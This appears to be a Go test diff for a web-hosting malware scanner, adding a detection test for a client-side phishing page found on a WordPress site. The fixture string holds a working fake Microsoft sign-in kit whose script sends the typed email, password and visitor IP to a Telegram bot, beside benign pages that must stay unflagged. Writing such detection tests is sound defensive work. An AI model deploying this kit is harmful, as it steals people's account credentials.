@@ -2038,3 +2038,38 @@ func TestFleetSelfHealingKitHomes(t *testing.T) {
 		t.Fatalf("hits %v, want the two scripts in ~/logs", hits)
 	}
 }
+
+// business200 (glasgowfitness.com, 2026-11-06): a Microsoft sign-in copy
+// in wp-content/maintenance/assets/HOT2.htm (beside WP Toolkit's own
+// maintenance page) sent the address and two passwords from the browser
+// to a Telegram bot; no form, no PHP, and the clone rule did not see it.
+// Inert fixture (made-up token); WP Toolkit's page and look-alikes stay
+// clean.
+func TestFleetClientSideTelegramPhish(t *testing.T) {
+	s := newScanner(t)
+	kit := "<!DOCTYPE html><html><head><title>Sign in to your Microsoft account</title></head><body>\n" +
+		"<input type=\"text\" id=\"emailInput\"><input type=\"password\" id=\"passwordInput\"><button id=\"next\">Next</button>\n" +
+		"<script>\nconst accounts=[{token:'0000000000:inert-fixture',chatId:'1'}];\n" +
+		"function send(e,p){fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{\n" +
+		"accounts.map(a=>fetch(`https://api.telegram.org/bot${a.token}/sendMessage`,{method:'POST',body:JSON.stringify({chat_id:a.chatId,text:e+' '+p+' '+d.ip})}));\n" +
+		"window.location.href='https://login.live.com';});}\n" +
+		"document.getElementById('next').addEventListener('click',()=>send(document.getElementById('emailInput').value,document.getElementById('passwordInput').value));\n</script></body></html>\n"
+	for _, p := range []string{"/home/u/public_html/wp-content/maintenance/assets/HOT2.htm", "/home/u/public_html/office/index.html"} {
+		if d := s.checkContent(p, extOf(p), []byte(kit)); d == nil || d.Signature != "Phishing.Credentials.TelegramExfil" || d.Category != CatVirus {
+			t.Errorf("%s: %+v", p, d)
+		}
+	}
+	for what, body := range map[string]string{
+		// WP Toolkit's maintenance page.
+		"wp toolkit": "<!DOCTYPE html><html><head><title><?php echo $texts['title']; ?></title><script src=\"<?php echo $assetsUrl; ?>timer.js\"></script></head><body><h1><?php echo $texts['header']; ?></h1></body></html>\n",
+		// An order form sent to the shop's Telegram, no password.
+		"order form": "<html><body><input name=\"phone\"><script>fetch('https://api.telegram.org/bot0000:inert/sendMessage',{method:'POST',body:JSON.stringify({chat_id:1,text:document.querySelector('[name=phone]').value})});</script></body></html>\n",
+		// A login page that posts to its own server and links Telegram.
+		"own login": "<html><head><title>Members</title></head><body><form method=\"post\" action=\"/login\"><input type=\"password\" name=\"pwd\"></form><a href=\"https://t.me/ourchannel\">Telegram</a><script>fetch('/api/news')</script></body></html>\n",
+	} {
+		p := "/home/u/public_html/page.html"
+		if d := s.checkContent(p, extOf(p), []byte(body)); d != nil {
+			t.Errorf("%s: %+v", what, d)
+		}
+	}
+}
